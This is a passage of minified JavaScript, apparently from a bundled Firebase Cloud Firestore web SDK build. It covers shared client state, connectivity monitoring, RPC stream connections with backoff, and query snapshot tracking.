O("SharedClientState","READ",e,t),t}setItem(e,t){O("SharedClientState","SET",e,t),this.storage.setItem(e,t)}removeItem(e){O("SharedClientState","REMOVE",e),this.storage.removeItem(e)}ws(e){let t=e;if(t.storageArea===this.storage){if(O("SharedClientState","EVENT",t.key,t.newValue),t.key===this.Ds)return void Ze("Received WebStorage notification for local change. Another client might have garbage-collected our state");this.ui.enqueueRetryable(()=>R(this,null,function*(){if(this.started){if(t.key!==null){if(this.Cs.test(t.key)){if(t.newValue==null){let r=this.Gs(t.key);return this.zs(r,null)}{let r=this.js(t.key,t.newValue);if(r)return this.zs(r.clientId,r)}}else if(this.Fs.test(t.key)){if(t.newValue!==null){let r=this.Hs(t.key,t.newValue);if(r)return this.Js(r)}}else if(this.Ms.test(t.key)){if(t.newValue!==null){let r=this.Ys(t.key,t.newValue);if(r)return this.Zs(r)}}else if(t.key===this.xs){if(t.newValue!==null){let r=this.Ls(t.newValue);if(r)return this.Bs(r)}}else if(t.key===this.vs){let r=function(o){let s=rn.oe;if(o!=null)try{let a=JSON.parse(o);Q(typeof a=="number"),s=a}catch(a){Ze("SharedClientState","Failed to read sequence number from WebStorage",a)}return s}(t.newValue);r!==rn.oe&&this.sequenceNumberHandler(r)}else if(t.key===this.Os){let r=this.Xs(t.newValue);yield Promise.all(r.map(i=>this.syncEngine.eo(i)))}}}else this.bs.push(t)}))}}get Ks(){return this.Ss.get(this.ps)}Ns(){this.setItem(this.Ds,this.Ks.Vs())}qs(e,t,r){let i=new zf(this.currentUser,e,t,r),o=dM(this.persistenceKey,this.currentUser,e);this.setItem(o,i.Vs())}Qs(e){let t=dM(this.persistenceKey,this.currentUser,e);this.removeItem(t)}Us(e){let t={clientId:this.ps,onlineState:e};this.storage.setItem(this.xs,JSON.stringify(t))}$s(e,t,r){let i=n_(this.persistenceKey,e),o=new mu(e,t,r);this.setItem(i,o.Vs())}Ws(e){let t=JSON.stringify(Array.from(e));this.setItem(this.Os,t)}Gs(e){let t=this.Cs.exec(e);return t?t[1]:null}js(e,t){let r=this.Gs(e);return Gf.Rs(r,t)}Hs(e,t){let r=this.Fs.exec(e),i=Number(r[1]),o=r[2]!==void 0?r[2]:null;return zf.Rs(new st(o),i,t)}Ys(e,t){let r=this.Ms.exec(e),i=Number(r[1]);return mu.Rs(i,t)}Ls(e){return vw.Rs(e)}Xs(e){return JSON.parse(e)}Js(e){return R(this,null,function*(){if(e.user.uid===this.currentUser.uid)return this.syncEngine.no(e.batchId,e.state,e.error);O("SharedClientState",`Ignoring mutation for non-active user ${e.user.uid}`)})}Zs(e){return this.syncEngine.ro(e.targetId,e.state,e.error)}zs(e,t){let r=t?this.Ss.insert(e,t):this.Ss.remove(e),i=this.ks(this.Ss),o=this.ks(r),s=[],a=[];return o.forEach(c=>{i.has(c)||s.push(c)}),i.forEach(c=>{o.has(c)||a.push(c)}),this.syncEngine.io(s,a).then(()=>{this.Ss=r})}Bs(e){this.Ss.get(e.clientId)&&this.onlineStateHandler(e.onlineState)}ks(e){let t=dE();return e.forEach((r,i)=>{t=t.unionWith(i.activeTargetIds)}),t}},Wf=class{constructor(){this.so=new Pu,this.oo={},this.onlineStateHandler=null,this.sequenceNumberHandler=null}addPendingMutation(e){}updateMutationState(e,t,r){}addLocalQueryTarget(e,t=!0){return t&&this.so.fs(e),this.oo[e]||"not-current"}updateQueryState(e,t,r){this.oo[e]=t}removeLocalQueryTarget(e){this.so.gs(e)}isLocalQueryTarget(e){return this.so.activeTargetIds.has(e)}clearQueryState(e){delete this.oo[e]}getAllActiveQueryTargets(){return this.so.activeTargetIds}isActiveQueryTarget(e){return this.so.activeTargetIds.has(e)}start(){return this.so=new Pu,Promise.resolve()}handleUserChange(e,t,r){}setOnlineState(e){}shutdown(){}writeSequenceNumber(e){}notifyBundleLoaded(e){}};var _w=class{_o(e){}shutdown(){}};var Kf=class{constructor(){this.ao=()=>this.uo(),this.co=()=>this.lo(),this.ho=[],this.Po()}_o(e){this.ho.push(e)}shutdown(){window.removeEventListener("online",this.ao),window.removeEventListener("offline",this.co)}Po(){window.addEventListener("online",this.ao),window.addEventListener("offline",this.co)}uo(){O("ConnectivityMonitor","Network connectivity changed: AVAILABLE");for(let e of this.ho)e(0)}lo(){O("ConnectivityMonitor","Network connectivity changed: UNAVAILABLE");for(let e of this.ho)e(1)}static D(){return typeof window<"u"&&window.addEventListener!==void 0&&window.removeEventListener!==void 0}};var df=null;function r_(){return df===null?df=function(){return 268435456+Math.round(2147483648*Math.random())}():df++,"0x"+df.toString(16)}var y$={BatchGetDocuments:"batchGet",Commit:"commit",RunQuery:"runQuery",RunAggregationQuery:"runAggregationQuery"};var ww=class{constructor(e){this.Io=e.Io,this.To=e.To}Eo(e){this.Ao=e}Ro(e){this.Vo=e}mo(e){this.fo=e}onMessage(e){this.po=e}close(){this.To()}send(e){this.Io(e)}yo(){this.Ao()}wo(){this.Vo()}So(e){this.fo(e)}bo(e){this.po(e)}};var Tt="WebChannelConnection",Ew=class extends class{constructor(t){this.databaseInfo=t,this.databaseId=t.databaseId;let r=t.ssl?"https":"http",i=encodeURIComponent(this.databaseId.projectId),o=encodeURIComponent(this.databaseId.database);this.Do=r+"://"+t.host,this.vo=`projects/${i}/databases/${o}`,this.Co=this.databaseId.database==="(default)"?`project_id=${i}`:`project_id=${i}&database_id=${o}`}get Fo(){return!1}Mo(t,r,i,o,s){let a=r_(),c=this.xo(t,r.toUriEncodedString());O("RestConnection",`Sending RPC '${t}' ${a}:`,c,i);let l={"google-cloud-resource-prefix":this.vo,"x-goog-request-params":this.Co};return this.Oo(l,o,s),this.No(t,c,l,i).then(h=>(O("RestConnection",`Received RPC '${t}' ${a}: `,h),h),h=>{throw Mn("RestConnection",`RPC '${t}' ${a} failed with error: `,h,"url: ",c,"request:",i),h})}Lo(t,r,i,o,s,a){return this.Mo(t,r,i,o,s)}Oo(t,r,i){t["X-Goog-Api-Client"]=function(){return"gl-js/ fire/"+ma}(),t["Content-Type"]="text/plain",this.databaseInfo.appId&&(t["X-Firebase-GMPID"]=this.databaseInfo.appId),r&&r.headers.forEach((o,s)=>t[s]=o),i&&i.headers.forEach((o,s)=>t[s]=o)}xo(t,r){let i=y$[t];return`${this.Do}/v1/${r}:${i}`}terminate(){}}{constructor(e){super(e),this.forceLongPolling=e.forceLongPolling,this.autoDetectLongPolling=e.autoDetectLongPolling,this.useFetchStreams=e.useFetchStreams,this.longPollingOptions=e.longPollingOptions}No(e,t,r,i){let o=r_();return new Promise((s,a)=>{let c=new Qv;c.setWithCredentials(!0),c.listenOnce(Yv.COMPLETE,()=>{try{switch(c.getLastErrorCode()){case su.NO_ERROR:let h=c.getResponseJson();O(Tt,`XHR for RPC '${e}' ${o} received:`,JSON.stringify(h)),s(h);break;case su.TIMEOUT:O(Tt,`RPC '${e}' ${o} timed out`),a(new k(N.DEADLINE_EXCEEDED,"Request time out"));break;case su.HTTP_ERROR:let p=c.getStatus();if(O(Tt,`RPC '${e}' ${o} failed with status:`,p,"response text:",c.getResponseText()),p>0){let m=c.getResponseJson();Array.isArray(m)&&(m=m[0]);let y=m?.error;if(y&&y.status&&y.message){let D=function(T){let F=T.toLowerCase().replace(/_/g,"-");return Object.values(N).indexOf(F)>=0?F:N.UNKNOWN}(y.status);a(new k(D,y.message))}else a(new k(N.UNKNOWN,"Server responded with status "+c.getStatus()))}else a(new k(N.UNAVAILABLE,"Connection failed."));break;default:z()}}finally{O(Tt,`RPC '${e}' ${o} completed.`)}});let l=JSON.stringify(i);O(Tt,`RPC '${e}' ${o} sending request:`,i),c.send(t,"POST",l,r,15)})}Bo(e,t,r){let i=r_(),o=[this.Do,"/","google.firestore.v1.Firestore","/",e,"/channel"],s=Xv(),a=Jv(),c={httpSessionIdParam:"gsessionid",initMessageHeaders:{},messageUrlParams:{database:`projects/${this.databaseId.projectId}/databases/${this.databaseId.database}`},sendRawJson:!0,supportsCrossDomainXhr:!0,internalChannelParams:{forwardChannelRequestTimeoutMs:6e5},forceLongPolling:this.forceLongPolling,detectBufferingProxy:this.autoDetectLongPolling},l=this.longPollingOptions.timeoutSeconds;l!==void 0&&(c.longPollingTimeout=Math.round(1e3*l)),this.useFetchStreams&&(c.useFetchStreams=!0),this.Oo(c.initMessageHeaders,t,r),c.encodeInitMessageHeaders=!0;let h=o.join("");O(Tt,`Creating RPC '${e}' stream ${i}: ${h}`,c);let p=s.createWebChannel(h,c),m=!1,y=!1,D=new ww({Io:T=>{y?O(Tt,`Not sending because RPC '${e}' stream ${i} is closed:`,T):(m||(O(Tt,`Opening RPC '${e}' stream ${i} transport.`),p.open(),m=!0),O(Tt,`RPC '${e}' stream ${i} sending:`,T),p.send(T))},To:()=>p.close()}),b=(T,F,$)=>{T.listen(F,P=>{try{$(P)}catch(G){setTimeout(()=>{throw G},0)}})};return b(p,Us.EventType.OPEN,()=>{y||(O(Tt,`RPC '${e}' stream ${i} transport opened.`),D.yo())}),b(p,Us.EventType.CLOSE,()=>{y||(y=!0,O(Tt,`RPC '${e}' stream ${i} transport closed`),D.So())}),b(p,Us.EventType.ERROR,T=>{y||(y=!0,Mn(Tt,`RPC '${e}' stream ${i} transport errored:`,T),D.So(new k(N.UNAVAILABLE,"The operation could not be completed")))}),b(p,Us.EventType.MESSAGE,T=>{var F;if(!y){let $=T.data[0];Q(!!$);let P=$,G=P.error||((F=P[0])===null||F===void 0?void 0:F.error);if(G){O(Tt,`RPC '${e}' stream ${i} received error:`,G);let Z=G.status,K=function(w){let I=it[w];if(I!==void 0)return cx(I)}(Z),E=G.message;K===void 0&&(K=N.INTERNAL,E="Unknown error status: "+Z+" with message "+G.message),y=!0,D.So(new k(K,E)),p.close()}else O(Tt,`RPC '${e}' stream ${i} received:`,$),D.bo($)}}),b(a,Zv.STAT_EVENT,T=>{T.stat===af.PROXY?O(Tt,`RPC '${e}' stream ${i} detected buffering proxy`):T.stat===af.NOPROXY&&O(Tt,`RPC '${e}' stream ${i} detected no buffering proxy`)}),setTimeout(()=>{D.wo()},0),D}};function Fx(){return typeof window<"u"?window:null}function mf(){return typeof document<"u"?document:null}function Hu(n){return new F_(n,!0)}var ku=class{constructor(e,t,r=1e3,i=1.5,o=6e4){this.ui=e,this.timerId=t,this.ko=r,this.qo=i,this.Qo=o,this.Ko=0,this.$o=null,this.Uo=Date.now(),this.reset()}reset(){this.Ko=0}Wo(){this.Ko=this.Qo}Go(e){this.cancel();let t=Math.floor(this.Ko+this.zo()),r=Math.max(0,Date.now()-this.Uo),i=Math.max(0,t-r);i>0&&O("ExponentialBackoff",`Backing off for ${i} ms (base delay: ${this.Ko} ms, delay with jitter: ${t} ms, last attempt: ${r} ms ago)`),this.$o=this.ui.enqueueAfterDelay(this.timerId,i,()=>(this.Uo=Date.now(),e())),this.Ko*=this.qo,this.Ko<this.ko&&(this.Ko=this.ko),this.Ko>this.Qo&&(this.Ko=this.Qo)}jo(){this.$o!==null&&(this.$o.skipDelay(),this.$o=null)}cancel(){this.$o!==null&&(this.$o.cancel(),this.$o=null)}zo(){return(Math.random()-.5)*this.Ko}};var Qf=class{constructor(e,t,r,i,o,s,a,c){this.ui=e,this.Ho=r,this.Jo=i,this.connection=o,this.authCredentialsProvider=s,this.appCheckCredentialsProvider=a,this.listener=c,this.state=0,this.Yo=0,this.Zo=null,this.Xo=null,this.stream=null,this.e_=0,this.t_=new ku(e,t)}n_(){return this.state===1||this.state===5||this.r_()}r_(){return this.state===2||this.state===3}start(){this.e_=0,this.state!==4?this.auth():this.i_()}stop(){return R(this,null,function*(){this.n_()&&(yield this.close(0))})}s_(){this.state=0,this.t_.reset()}o_(){this.r_()&&this.Zo===null&&(this.Zo=this.ui.enqueueAfterDelay(this.Ho,6e4,()=>this.__()))}a_(e){this.u_(),this.stream.send(e)}__(){return R(this,null,function*(){if(this.r_())return this.close(0)})}u_(){this.Zo&&(this.Zo.cancel(),this.Zo=null)}c_(){this.Xo&&(this.Xo.cancel(),this.Xo=null)}close(e,t){return R(this,null,function*(){this.u_(),this.c_(),this.t_.cancel(),this.Yo++,e!==4?this.t_.reset():t&&t.code===N.RESOURCE_EXHAUSTED?(Ze(t.toString()),Ze("Using maximum backoff delay to prevent overloading the backend."),this.t_.Wo()):t&&t.code===N.UNAUTHENTICATED&&this.state!==3&&(this.authCredentialsProvider.invalidateToken(),this.appCheckCredentialsProvider.invalidateToken()),this.stream!==null&&(this.l_(),this.stream.close(),this.stream=null),this.state=e,yield this.listener.mo(t)})}l_(){}auth(){this.state=1;let e=this.h_(this.Yo),t=this.Yo;Promise.all([this.authCredentialsProvider.getToken(),this.appCheckCredentialsProvider.getToken()]).then(([r,i])=>{this.Yo===t&&this.P_(r,i)},r=>{e(()=>{let i=new k(N.UNKNOWN,"Fetching auth token failed: "+r.message);return this.I_(i)})})}P_(e,t){let r=this.h_(this.Yo);this.stream=this.T_(e,t),this.stream.Eo(()=>{r(()=>this.listener.Eo())}),this.stream.Ro(()=>{r(()=>(this.state=2,this.Xo=this.ui.enqueueAfterDelay(this.Jo,1e4,()=>(this.r_()&&(this.state=3),Promise.resolve())),this.listener.Ro()))}),this.stream.mo(i=>{r(()=>this.I_(i))}),this.stream.onMessage(i=>{r(()=>++this.e_==1?this.E_(i):this.onNext(i))})}i_(){this.state=5,this.t_.Go(()=>R(this,null,function*(){this.state=0,this.start()}))}I_(e){return O("PersistentStream",`close with error: ${e}`),this.stream=null,this.close(4,e)}h_(e){return t=>{this.ui.enqueueAndForget(()=>this.Yo===e?t():(O("PersistentStream","stream callback skipped by getCloseGuardedDispatcher."),Promise.resolve()))}}},Iw=class extends Qf{constructor(e,t,r,i,o,s){super(e,"listen_stream_connection_backoff","listen_stream_idle","health_check_timeout",t,r,i,s),this.serializer=o}T_(e,t){return this.connection.Bo("Listen",e,t)}E_(e){return this.onNext(e)}onNext(e){this.t_.reset();let t=t$(this.serializer,e),r=function(o){if(!("targetChange"in o))return ee.min();let s=o.targetChange;return s.targetIds&&s.targetIds.length?ee.min():s.readTime?Xe(s.readTime):ee.min()}(e);return this.listener.d_(t,r)}A_(e){let t={};t.database=U_(this.serializer),t.addTarget=function(o,s){let a,c=s.target;if(a=Tf(c)?{documents:mx(o,c)}:{query:yx(o,c)._t},a.targetId=s.targetId,s.resumeToken.approximateByteSize()>0){a.resumeToken=lx(o,s.resumeToken);let l=V_(o,s.expectedCount);l!==null&&(a.expectedCount=l)}else if(s.snapshotVersion.compareTo(ee.min())>0){a.readTime=oa(o,s.snapshotVersion.toTimestamp());let l=V_(o,s.expectedCount);l!==null&&(a.expectedCount=l)}return a}(this.serializer,e);let r=r$(this.serializer,e);r&&(t.labels=r),this.a_(t)}R_(e){let t={};t.database=U_(this.serializer),t.removeTarget=e,this.a_(t)}},Dw=class extends Qf{constructor(e,t,r,i,o,s){super(e,"write_stream_connection_backoff","write_stream_idle","health_check_timeout",t,r,i,s),this.serializer=o}get V_(){return this.e_>0}start(){this.lastStreamToken=void 0,super.start()}l_(){this.V_&&this.m_([])}T_(e,t){return this.connection.Bo("Write",e,t)}E_(e){return Q(!!e.streamToken),this.lastStreamToken=e.streamToken,Q(!e.writeResults||e.writeResults.length===0),this.listener.f_()}onNext(e){Q(!!e.streamToken),this.lastStreamToken=e.streamToken,this.t_.reset();let t=n$(e.writeResults,e.commitTime),r=Xe(e.commitTime);return this.listener.g_(r,t)}p_(){let e={};e.database=U_(this.serializer),this.a_(e)}m_(e){let t={streamToken:this.lastStreamToken,writes:e.map(r=>xu(this.serializer,r))};this.a_(t)}};var Cw=class extends class{}{constructor(e,t,r,i){super(),this.authCredentials=e,this.appCheckCredentials=t,this.connection=r,this.serializer=i,this.y_=!1}w_(){if(this.y_)throw new k(N.FAILED_PRECONDITION,"The client has already been terminated.")}Mo(e,t,r,i){return this.w_(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then(([o,s])=>this.connection.Mo(e,L_(t,r),i,o,s)).catch(o=>{throw o.name==="FirebaseError"?(o.code===N.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),o):new k(N.UNKNOWN,o.toString())})}Lo(e,t,r,i,o){return this.w_(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then(([s,a])=>this.connection.Lo(e,L_(t,r),i,s,a,o)).catch(s=>{throw s.name==="FirebaseError"?(s.code===N.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),s):new k(N.UNKNOWN,s.toString())})}terminate(){this.y_=!0,this.connection.terminate()}},bw=class{constructor(e,t){this.asyncQueue=e,this.onlineStateHandler=t,this.state="Unknown",this.S_=0,this.b_=null,this.D_=!0}v_(){this.S_===0&&(this.C_("Unknown"),this.b_=this.asyncQueue.enqueueAfterDelay("online_state_timeout",1e4,()=>(this.b_=null,this.F_("Backend didn't respond within 10 seconds."),this.C_("Offline"),Promise.resolve())))}M_(e){this.state==="Online"?this.C_("Unknown"):(this.S_++,this.S_>=1&&(this.x_(),this.F_(`Connection failed 1 times. Most recent error: ${e.toString()}`),this.C_("Offline")))}set(e){this.x_(),this.S_=0,e==="Online"&&(this.D_=!1),this.C_(e)}C_(e){e!==this.state&&(this.state=e,this.onlineStateHandler(e))}F_(e){let t=`Could not reach Cloud Firestore backend. ${e}
This typically indicates that your device does not have a healthy Internet connection at the moment. The client will operate in offline mode until it is able to successfully connect to the backend.`;this.D_?(Ze(t),this.D_=!1):O("OnlineStateTracker",t)}x_(){this.b_!==null&&(this.b_.cancel(),this.b_=null)}};var Tw=class{constructor(e,t,r,i,o){this.localStore=e,this.datastore=t,this.asyncQueue=r,this.remoteSyncer={},this.O_=[],this.N_=new Map,this.L_=new Set,this.B_=[],this.k_=o,this.k_._o(s=>{r.enqueueAndForget(()=>R(this,null,function*(){xi(this)&&(O("RemoteStore","Restarting streams for network reachability change."),yield function(c){return R(this,null,function*(){let l=H(c);l.L_.add(4),yield va(l),l.q_.set("Unknown"),l.L_.delete(4),yield qu(l)})}(this))}))}),this.q_=new bw(r,i)}};function qu(n){return R(this,null,function*(){if(xi(n))for(let e of n.B_)yield e(!0)})}function va(n){return R(this,null,function*(){for(let e of n.B_)yield e(!1)})}function mp(n,e){let t=H(n);t.N_.has(e.targetId)||(t.N_.set(e.targetId,e),_E(t)?vE(t):wa(t).r_()&&yE(t,e))}function la(n,e){let t=H(n),r=wa(t);t.N_.delete(e),r.r_()&&Vx(t,e),t.N_.size===0&&(r.r_()?r.o_():xi(t)&&t.q_.set("Unknown"))}function yE(n,e){if(n.Q_.xe(e.targetId),e.resumeToken.approximateByteSize()>0||e.snapshotVersion.compareTo(ee.min())>0){let t=n.remoteSyncer.getRemoteKeysForTarget(e.targetId).size;e=e.withExpectedCount(t)}wa(n).A_(e)}function Vx(n,e){n.Q_.xe(e),wa(n).R_(e)}function vE(n){n.Q_=new O_({getRemoteKeysForTarget:e=>n.remoteSyncer.getRemoteKeysForTarget(e),ot:e=>n.N_.get(e)||null,tt:()=>n.datastore.serializer.databaseId}),wa(n).start(),n.q_.v_()}function _E(n){return xi(n)&&!wa(n).n_()&&n.N_.size>0}function xi(n){return H(n).L_.size===0}function Lx(n){n.Q_=void 0}function v$(n){return R(this,null,function*(){n.q_.set("Online")})}function _$(n){return R(this,null,function*(){n.N_.forEach((e,t)=>{yE(n,e)})})}function w$(n,e){return R(this,null,function*(){Lx(n),_E(n)?(n.q_.M_(e),vE(n)):n.q_.set("Unknown")})}function E$(n,e,t){return R(this,null,function*(){if(n.q_.set("Online"),e instanceof xf&&e.state===2&&e.cause)try{yield function(i,o){return R(this,null,function*(){let s=o.cause;for(let a of o.targetIds)i.N_.has(a)&&(yield i.remoteSyncer.rejectListen(a,s),i.N_.delete(a),i.Q_.removeTarget(a))})}(n,e)}catch(r){O("RemoteStore","Failed to remove targets %s: %s ",e.targetIds.join(","),r),yield Yf(n,r)}else if(e instanceof Js?n.Q_.Ke(e):e instanceof Mf?n.Q_.He(e):n.Q_.We(e),!t.isEqual(ee.min()))try{let r=yield Rx(n.localStore);t.compareTo(r)>=0&&(yield function(o,s){let a=o.Q_.rt(s);return a.targetChanges.forEach((c,l)=>{if(c.resumeToken.approximateByteSize()>0){let h=o.N_.get(l);h&&o.N_.set(l,h.withResumeToken(c.resumeToken,s))}}),a.targetMismatches.forEach((c,l)=>{let h=o.N_.get(c);if(!h)return;o.N_.set(c,h.withResumeToken(et.EMPTY_BYTE_STRING,h.snapshotVersion)),Vx(o,c);let p=new sa(h.target,c,l,h.sequenceNumber);yE(o,p)}),o.remoteSyncer.applyRemoteEvent(a)}(n,t))}catch(r){O("RemoteStore","Failed to raise snapshot:",r),yield Yf(n,r)}})}function Yf(n,e,t){return R(this,null,function*(){if(!Mi(e))throw e;n.L_.add(1),yield va(n),n.q_.set("Offline"),t||(t=()=>Rx(n.localStore)),n.asyncQueue.enqueueRetryable(()=>R(this,null,function*(){O("RemoteStore","Retrying IndexedDB access"),yield t(),n.L_.delete(1),yield qu(n)}))})}function Ux(n,e){return e().catch(t=>Yf(n,t,e))}function _a(n){return R(this,null,function*(){let e=H(n),t=Si(e),r=e.O_.length>0?e.O_[e.O_.length-1].batchId:-1;for(;I$(e);)try{let i=yield p$(e.localStore,r);if(i===null){e.O_.length===0&&t.o_();break}r=i.batchId,D$(e,i)}catch(i){yield Yf(e,i)}jx(e)&&Bx(e)})}function I$(n){return xi(n)&&n.O_.length<10}function D$(n,e){n.O_.push(e);let t=Si(n);t.r_()&&t.V_&&t.m_(e.mutations)}function jx(n){return xi(n)&&!Si(n).n_()&&n.O_.length>0}function Bx(n){Si(n).start()}function C$(n){return R(this,null,function*(){Si(n).p_()})}function b$(n){return R(this,null,function*(){let e=Si(n);for(let t of n.O_)e.m_(t.mutations)})}function T$(n,e,t){return R(this,null,function*(){let r=n.O_.shift(),i=N_.from(r,e,t);yield Ux(n,()=>n.remoteSyncer.applySuccessfulWrite(i)),yield _a(n)})}function S$(n,e){return R(this,null,function*(){e&&Si(n).V_&&(yield function(r,i){return R(this,null,function*(){if(function(s){return ax(s)&&s!==N.ABORTED}(i.code)){let o=r.O_.shift();Si(r).s_(),yield Ux(r,()=>r.remoteSyncer.rejectFailedWrite(o.batchId,i)),yield _a(r)}})}(n,e)),jx(n)&&Bx(n)})}function hM(n,e){return R(this,null,function*(){let t=H(n);t.asyncQueue.verifyOperationInProgress(),O("RemoteStore","RemoteStore received new credentials");let r=xi(t);t.L_.add(3),yield va(t),r&&t.q_.set("Unknown"),yield t.remoteSyncer.handleCredentialChange(e),t.L_.delete(3),yield qu(t)})}function Sw(n,e){return R(this,null,function*(){let t=H(n);e?(t.L_.delete(2),yield qu(t)):e||(t.L_.add(2),yield va(t),t.q_.set("Unknown"))})}function wa(n){return n.K_||(n.K_=function(t,r,i){let o=H(t);return o.w_(),new Iw(r,o.connection,o.authCredentials,o.appCheckCredentials,o.serializer,i)}(n.datastore,n.asyncQueue,{Eo:v$.bind(null,n),Ro:_$.bind(null,n),mo:w$.bind(null,n),d_:E$.bind(null,n)}),n.B_.push(e=>R(this,null,function*(){e?(n.K_.s_(),_E(n)?vE(n):n.q_.set("Unknown")):(yield n.K_.stop(),Lx(n))}))),n.K_}function Si(n){return n.U_||(n.U_=function(t,r,i){let o=H(t);return o.w_(),new Dw(r,o.connection,o.authCredentials,o.appCheckCredentials,o.serializer,i)}(n.datastore,n.asyncQueue,{Eo:()=>Promise.resolve(),Ro:C$.bind(null,n),mo:S$.bind(null,n),f_:b$.bind(null,n),g_:T$.bind(null,n)}),n.B_.push(e=>R(this,null,function*(){e?(n.U_.s_(),yield _a(n)):(yield n.U_.stop(),n.O_.length>0&&(O("RemoteStore",`Stopping write stream with ${n.O_.length} pending writes`),n.O_=[]))}))),n.U_}var Aw=class n{constructor(e,t,r,i,o){this.asyncQueue=e,this.timerId=t,this.targetTimeMs=r,this.op=i,this.removalCallback=o,this.deferred=new lt,this.then=this.deferred.promise.then.bind(this.deferred.promise),this.deferred.promise.catch(s=>{})}get promise(){return this.deferred.promise}static createAndSchedule(e,t,r,i,o){let s=Date.now()+r,a=new n(e,t,s,i,o);return a.start(r),a}start(e){this.timerHandle=setTimeout(()=>this.handleDelayElapsed(),e)}skipDelay(){return this.handleDelayElapsed()}cancel(e){this.timerHandle!==null&&(this.clearTimeout(),this.deferred.reject(new k(N.CANCELLED,"Operation cancelled"+(e?": "+e:""))))}handleDelayElapsed(){this.asyncQueue.enqueueAndForget(()=>this.timerHandle!==null?(this.clearTimeout(),this.op().then(e=>this.deferred.resolve(e))):Promise.resolve())}clearTimeout(){this.timerHandle!==null&&(this.removalCallback(this),clearTimeout(this.timerHandle),this.timerHandle=null)}};function Ea(n,e){if(Ze("AsyncQueue",`${e}: ${n}`),Mi(n))return new k(N.UNAVAILABLE,`${e}: ${n}`);throw n}var Zf=class n{constructor(e){this.comparator=e?(t,r)=>e(t,r)||q.comparator(t.key,r.key):(t,r)=>q.comparator(t.key,r.key),this.keyedMap=du(),this.sortedSet=new Fe(this.comparator)}static emptySet(e){return new n(e.comparator)}has(e){return this.keyedMap.get(e)!=null}get(e){return this.keyedMap.get(e)}first(){return this.sortedSet.minKey()}last(){return this.sortedSet.maxKey()}isEmpty(){return this.sortedSet.isEmpty()}indexOf(e){let t=this.keyedMap.get(e);return t?this.sortedSet.indexOf(t):-1}get size(){return this.sortedSet.size}forEach(e){this.sortedSet.inorderTraversal((t,r)=>(e(t),!1))}add(e){let t=this.delete(e.key);return t.copy(t.keyedMap.insert(e.key,e),t.sortedSet.insert(e,null))}delete(e){let t=this.get(e);return t?this.copy(this.keyedMap.remove(e),this.sortedSet.remove(t)):this}isEqual(e){if(!(e instanceof n)||this.size!==e.size)return!1;let t=this.sortedSet.getIterator(),r=e.sortedSet.getIterator();for(;t.hasNext();){let i=t.getNext().key,o=r.getNext().key;if(!i.isEqual(o))return!1}return!0}toString(){let e=[];return this.forEach(t=>{e.push(t.toString())}),e.length===0?"DocumentSet ()":`DocumentSet (
  `+e.join(`  
`)+`
)`}copy(e,t){let r=new n;return r.comparator=this.comparator,r.keyedMap=e,r.sortedSet=t,r}};var Jf=class{constructor(){this.W_=new Fe(q.comparator)}track(e){let t=e.doc.key,r=this.W_.get(t);r?e.type!==0&&r.type===3?this.W_=this.W_.insert(t,e):e.type===3&&r.type!==1?this.W_=this.W_.insert(t,{type:r.type,doc:e.doc}):e.type===2&&r.type===2?this.W_=this.W_.insert(t,{type:2,doc:e.doc}):e.type===2&&r.type===0?this.W_=this.W_.insert(t,{type:0,doc:e.doc}):e.type===1&&r.type===0?this.W_=this.W_.remove(t):e.type===1&&r.type===2?this.W_=this.W_.insert(t,{type:1,doc:r.doc}):e.type===0&&r.type===1?this.W_=this.W_.insert(t,{type:2,doc:e.doc}):z():this.W_=this.W_.insert(t,e)}G_(){let e=[];return this.W_.inorderTraversal((t,r)=>{e.push(r)}),e}},da=class n{constructor(e,t,r,i,o,s,a,c,l){this.query=e,this.docs=t,this.oldDocs=r,this.docChanges=i,this.mutatedKeys=o,this.fromCache=s,this.syncStateChanged=a,this.excludesMetadataChanges=c,this.hasCachedResults=l}static fromInitialDocuments(e,t,r,i,o){let s=[];return t.forEach(a=>{s.push({type:0,doc:a})}),new n(e,t,Zf.emptySet(t),s,r,i,!0,!1,o)}get hasPendingWrites(){return!this.mutatedKeys.isEmpty()}isEqual(e){if(!(this.fromCache===e.fromCache&&this.hasCachedResults===e.hasCachedResults&&this.syncStateChanged===e.syncStateChanged&&this.mutatedKeys.isEqual(e.mutatedKeys)&&Bu(this.query,e.query)&&this.docs.isEqual(e.docs)&&this.oldDocs.isEqual(e.oldDocs)))return!1;let t=this.docChanges,r=e.docChanges;if(t.length!==r.length)return!1;for(let i=0;i<t.length;i++)if(t[i].type!==r[i].type||!t[i].doc.isEqual(r[i].doc))return!1;return!0}};var Mw=class{constructor(){this.z_=void 0,this.j_=[]}H_(){return this.j_.some(e=>e.J_())}},xw=class{constructor(){this.queries=fM(),this.onlineState="Unknown",this.Y_=new Set}terminate(){(function(t,r){let i=H(t),o=i.queries;i.queries=fM(),o.forEach((s,a)=>{for(let c of a.j_)c.onError(r)})})(this,new k(N.ABORTED,"Firestore shutting down"))}};function fM(){return new Zn(n=>WM(n),Bu)}function wE(n,e){return R(this,null,function*(){let t=H(n),r=3,i=e.query,o=t.queries.get(i);o?!o.H_()&&e.J_()&&(r=2):(o=new Mw,r=e.J_()?0:1);try{switch(r){case 0:o.z_=yield t.onListen(i,!0);break;case 1:o.z_=yield t.onListen(i,!1);break;case 2:yield t.onFirstRemoteStoreListen(i)}}catch(s){let a=Ea(s,`Initialization of query '${zs(e.query)}' failed`);return void e.onError(a)}t.queries.set(i,o),o.j_.push(e),e.Z_(t.onlineState),o.z_&&e.X_(o.z_)&&IE(t)})}function EE(n,e){return R(this,null,function*(){let t=H(n),r=e.query,i=3,o=t.queries.get(r);if(o){let s=o.j_.indexOf(e);s>=0&&(o.j_.splice(s,1),o.j_.length===0?i=e.J_()?0:1:!o.H_()&&e.J_()&&(i=2))}switch(i){case 0:return t.queries.delete(r),t.onUnlisten(r,!0);case 1:return t.queries.delete(r),t.onUnlisten(r,!1);case 2:return t.onLastRemoteStoreUnlisten(r);default:return}})}function A$(n,e){let t=H(n),r=!1;for(let i of e){let o=i.query,s=t.queries.get(o);if(s){for(let a of s.j_)a.X_(i)&&(r=!0);s.z_=i}}r&&IE(t)}function M$(n,e,t){let r=H(n),i=r.queries.get(e);if(i)for(let o of i.j_)o.onError(t);r.queries.delete(e)}function IE(n){n.Y_.forEach(e=>{e.next()})}var Rw,pM;(pM=Rw||(Rw={})).ea="default",pM.Cache="cache";var 